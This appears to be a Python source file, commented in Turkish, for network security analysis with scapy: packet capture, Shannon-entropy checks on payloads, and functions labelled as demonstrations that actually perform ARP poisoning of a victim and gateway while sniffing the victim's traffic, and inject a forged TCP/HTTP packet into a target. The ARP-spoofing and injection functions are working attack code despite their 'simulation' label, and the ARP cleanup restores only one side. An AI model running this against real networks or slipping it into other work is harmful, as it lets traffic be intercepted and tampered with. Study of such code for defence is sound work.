# security_analysis.py - Güvenlik analizi ve saldırı simülasyonları
from scapy.all import sniff, IP, TCP, Raw, send, sr1, wrpcap
import time
import threading
import random
import os
import math

# network_analysis.py içindeki run_iperf_client fonksiyonu zaten subprocess kullanıyor, bu sorun yaratmamalı

# packet_capture fonksiyonunu güncelleyelim (security_analysis.py içinde)
def packet_capture(interface, filter_str, output_file=None, count=100):
    """
    Wireshark'a benzer şekilde paket yakalama
    """
    import platform
    
    if platform.system() == "Windows":
        print("Windows üzerinde paket yakalama için Wireshark kullanmanız önerilir.")
        print("Alternatif olarak, şu komutu bir yönetici komut satırında çalıştırabilirsiniz:")
        print(f"  tshark -i {interface} -f \"{filter_str}\" -c {count} -w {output_file or 'capture.pcap'}")
        return []
    else:
        from scapy.all import sniff, wrpcap
        print(f"Paket yakalama başlatıldı: {interface}")
        packets = sniff(iface=interface, filter=filter_str, count=count)
        
        if output_file:
            wrpcap(output_file, packets)
            print(f"Paketler kaydedildi: {output_file}")
        
        return packets

def analyze_encrypted_data(packets):
    """
    Yakalanan paketlerdeki şifreli verileri analiz etme
    """
    encrypted_payloads = []
    
    for packet in packets:
        if Raw in packet:
            payload = packet[Raw].load
            encrypted_payloads.append(payload)
    
    # Entropi analizi - şifreleme doğrulama için
    entropy_scores = []
    for payload in encrypted_payloads:
        if len(payload) > 0:
            entropy = calculate_shannon_entropy(payload)
            entropy_scores.append(entropy)
    
    avg_entropy = sum(entropy_scores) / len(entropy_scores) if entropy_scores else 0
    print(f"Ortalama entropi: {avg_entropy:.4f} (>7.5 genellikle şifrelenmiş veriyi gösterir)")
    
    return avg_entropy

def calculate_shannon_entropy(data):
    """
    Shannon Entropi hesaplama (şifreli verinin rastgeleliğini ölçmek için)
    """
    if not data:
        return 0
    
    entropy = 0
    for x in range(256):
        p_x = float(data.count(x.to_bytes(1, byteorder='big'))) / len(data)
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
    
    return entropy

def mitm_simulation(victim_ip, gateway_ip, interface="eth0"):
    """
    MITM saldırısı simülasyonu (yalnızca gösterim amaçlı)
    """
    import platform
    
    if platform.system() == "Windows":
        print("MITM simülasyonu şu anda Windows üzerinde desteklenmiyor.")
        print("Bu simülasyon gerçek bir saldırı değildir, sadece demonstrasyon amaçlıdır.")
        return []
    else:
    
        def arp_poison():
            from scapy.all import ARP, Ether, sendp
            
            victim_mac = get_mac(victim_ip)
            gateway_mac = get_mac(gateway_ip)
            
            if not victim_mac or not gateway_mac:
                print("MAC adresleri bulunamadı")
                return
            
            print(f"Hedef: {victim_ip} ({victim_mac})")
            print(f"Gateway: {gateway_ip} ({gateway_mac})")
            
            # ARP zehirleme paketleri
            victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
            
            try:
                # 10 saniye boyunca ARP zehirleme
                for _ in range(10):
                    sendp(victim_packet, verbose=0)
                    sendp(gateway_packet, verbose=0)
                    time.sleep(1)
                
                # Temizleme (doğru ARP bilgilerini geri yükle)
                restore_arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
                sendp(restore_arp, verbose=0)
                
                print("MITM simülasyonu tamamlandı")
            except:
                print("MITM simülasyonu başarısız oldu")
        
        def get_mac(ip):
            try:
                from scapy.all import Ether, ARP, srp
                resp, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
                if resp:
                    return resp[0][1].hwsrc
                return None
            except:
                return None
        
        # Ayrı bir thread'de çalıştır
        thread = threading.Thread(target=arp_poison)
        thread.daemon = True
        thread.start()
        
        # MITM sırasında paketleri yakala
        packets = packet_capture(interface, f"host {victim_ip}", count=50)
        return packets

def packet_injection_simulation(target_ip, target_port=80):
    """
    Paket enjeksiyonu simülasyonu
    """
    import platform
    
    if platform.system() == "Windows":
        print("Paket enjeksiyonu simülasyonu şu anda Windows üzerinde desteklenmiyor.")
        print("Bu simülasyon gerçek bir saldırı değildir, sadece demonstrasyon amaçlıdır.")
        return False
    else:
    
        # HTTP isteği gibi görünen sahte paket
        fake_http_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept: text/html\r\n\r\n"
        )
        
        # IP ve TCP paketleri oluştur
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")  # SYN flag
        
        # 3-way handshake simülasyonu
        syn = ip/tcp
        syn_ack = sr1(syn, timeout=2, verbose=0)
        
        if syn_ack and 'SA' in str(syn_ack.flags):
            # Handshake tamamlandı, sahte veri enjekte et
            ack = IP(dst=target_ip)/TCP(
                dport=target_port,
                sport=syn_ack.dport,
                seq=syn_ack.ack,
                ack=syn_ack.seq + 1,
                flags="A"
            )/Raw(load=fake_http_request)
            
            send(ack, verbose=0)
            print("Sahte HTTP isteği enjekte edildi")
            return True
        else:
            print("Bağlantı kurulamadı")
            return False